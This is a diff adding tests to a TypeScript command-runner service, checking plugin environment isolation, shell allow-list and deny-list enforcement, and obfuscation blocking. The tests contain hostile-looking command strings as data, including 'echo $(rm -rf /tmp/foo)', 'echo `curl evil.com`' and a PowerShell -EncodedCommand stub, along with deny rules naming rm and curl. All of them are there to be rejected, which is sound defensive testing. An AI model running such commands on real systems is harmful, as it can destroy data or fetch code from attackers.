@@ -12,6 +12,7 @@ function createBaseSettings(): CommandRunnerSettings {
     maxTimeoutMs: 300_000,
     maxOutputBytes: 1024 * 1024,
     maxConcurrent: 2,
+    maxQueueSize: 20,
     denyEnvKeys: [],
     maskEnvKeysInAudit: [],
     allowList: [],
@@ -346,5 +347,197 @@ describe('command runner service', () => {
     assert.equal(getSettings().audit.records.length, 1)
     assert.deepEqual(getSettings().audit.records[0].envKeys, ['SECRET_TOKEN=***'])
     assert.equal(getSettings().audit.records[0].status, 'blocked')
+  })
+
+  // ========== H1: 插件 envKeys 接通 ==========
+  it('plugin without envKeys gets minimal safe env baseline only', async () => {
+    const { service } = createInMemoryRunner()
+    // 主进程设置一个非基线的变量
+    process.env.__MULBY_TEST_SECRET = 'super-secret-value'
+    try {
+      const result = await service.runCommand(
+        {
+          command: process.execPath,
+          args: ['-e', 'process.stdout.write(process.env.__MULBY_TEST_SECRET || "missing")']
+        },
+        { source: 'plugin', pluginId: 'p1', runCommandAllowed: true }
+      )
+      assert.equal(result.stdout, 'missing', '插件未声明 envKeys 时不应继承非基线变量')
+    } finally {
+      delete process.env.__MULBY_TEST_SECRET
+    }
+  })
+
+  it('plugin with envKeys array inherits declared variables', async () => {
+    const { service } = createInMemoryRunner()
+    process.env.__MULBY_TEST_ALLOWED = 'inherited-ok'
+    try {
+      const result = await service.runCommand(
+        {
+          command: process.execPath,
+          args: ['-e', 'process.stdout.write(process.env.__MULBY_TEST_ALLOWED || "missing")']
+        },
+        {
+          source: 'plugin',
+          pluginId: 'p1',
+          runCommandAllowed: true,
+          envKeys: ['__MULBY_TEST_ALLOWED']
+        }
+      )
+      assert.equal(result.stdout, 'inherited-ok', 'manifest envKeys 应让指定变量被继承')
+    } finally {
+      delete process.env.__MULBY_TEST_ALLOWED
+    }
+  })
+
+  it('plugin with envKeys="*" inherits full process env', async () => {
+    const { service } = createInMemoryRunner()
+    process.env.__MULBY_TEST_WILDCARD = 'wildcard-ok'
+    try {
+      const result = await service.runCommand(
+        {
+          command: process.execPath,
+          args: ['-e', 'process.stdout.write(process.env.__MULBY_TEST_WILDCARD || "missing")']
+        },
+        {
+          source: 'plugin',
+          pluginId: 'p1',
+          runCommandAllowed: true,
+          envKeys: '*'
+        }
+      )
+      assert.equal(result.stdout, 'wildcard-ok', 'envKeys="*" 应视为完整继承')
+    } finally {
+      delete process.env.__MULBY_TEST_WILDCARD
+    }
+  })
+
+  // ========== H2: allowList 在 shell:true 下深度校验 ==========
+  it('shell:true allowList blocks inner command even if wrapper matches', async () => {
+    const { service } = createInMemoryRunner({
+      settings: {
+        allowShell: true,
+        allowList: [
+          { id: 'r1', enabled: true, mode: 'prefix', value: 'sh' }
+        ]
+      }
+    })
+    // sh 在白名单；但内部命令 curl 不在 → 应被拒
+    await assert.rejects(
+      service.runCommand(
+        {
+          command: 'sh',
+          args: ['-c', 'curl http://example.com'],
+          shell: true
+        },
+        { source: 'app', assumeUserApproved: true }
+      ),
+      /命令不在白名单中/,
+      'shell:true 下 allowList 应对内层命令做深度校验'
+    )
+  })
+
+  it('shell:true allowList passes when all inner tokens are whitelisted', async () => {
+    const { service } = createInMemoryRunner({
+      settings: {
+        allowShell: true,
+        allowList: [
+          { id: 'r1', enabled: true, mode: 'prefix', value: 'sh' },
+          { id: 'r2', enabled: true, mode: 'prefix', value: process.execPath.toLowerCase() }
+        ]
+      }
+    })
+    // 内层就是 node 自身，且基线 allowList 含 process.execPath
+    const result = await service.runCommand(
+      {
+        command: 'sh',
+        args: ['-c', `${process.execPath} -e "process.stdout.write('inner-ok')"`],
+        shell: true
+      },
+      { source: 'app', assumeUserApproved: true }
+    )
+    assert.equal(result.success, true)
+  })
+
+  // ========== H3: $()/backtick token 提取 + 混淆模式拦截 ==========
+  it('shell:true denyList catches command inside $() substitution', async () => {
+    const { service } = createInMemoryRunner({
+      settings: {
+        allowShell: true,
+        denyList: [
+          { id: 'd1', enabled: true, mode: 'prefix', value: 'rm' }
+        ]
+      }
+    })
+    await assert.rejects(
+      service.runCommand(
+        {
+          command: 'sh',
+          args: ['-c', 'echo $(rm -rf /tmp/foo)'],
+          shell: true
+        },
+        { source: 'app', assumeUserApproved: true }
+      ),
+      /命中黑名单/,
+      '$(...) 内部的 rm 应被 denyList 拦截'
+    )
+  })
+
+  it('shell:true denyList catches command inside backtick substitution', async () => {
+    const { service } = createInMemoryRunner({
+      settings: {
+        allowShell: true,
+        denyList: [
+          { id: 'd1', enabled: true, mode: 'prefix', value: 'curl' }
+        ]
+      }
+    })
+    await assert.rejects(
+      service.runCommand(
+        {
+          command: 'sh',
+          args: ['-c', 'echo `curl evil.com`'],
+          shell: true
+        },
+        { source: 'app', assumeUserApproved: true }
+      ),
+      /命中黑名单/,
+      '`cmd` 内部的 curl 应被 denyList 拦截'
+    )
+  })
+
+  it('shell:true rejects obfuscated patterns (-EncodedCommand / eval base64)', async () => {
+    const { service } = createInMemoryRunner({
+      settings: {
+        allowShell: true,
+        allowList: [{ id: 'r1', enabled: true, mode: 'prefix', value: 'powershell' }]
+      }
+    })
+    await assert.rejects(
+      service.runCommand(
+        {
+          command: 'powershell',
+          args: ['-EncodedCommand', 'SQBFAFgA'],
+          shell: true
+        },
+        { source: 'app', assumeUserApproved: true }
+      ),
+      /混淆\/编码特征/,
+      'PowerShell -EncodedCommand 应被混淆拦截器拦截'
+    )
+  })
+
+  // ========== H5: spawn env fallback 移除 ==========
+  // 此场景覆盖「app source 没有显式 env 时也能正常跑」
+  it('app source without input env still runs (safeEnv inherits process.env)', async () => {
+    const { service } = createInMemoryRunner()
+    const result = await service.runCommand(
+      {
+        command: process.execPath,
+        args: ['-e', 'process.stdout.write(String(typeof process.env.PATH === "string"))']
+      },
+      { source: 'app' }
+    )
+    assert.equal(result.stdout, 'true')
   })
 })
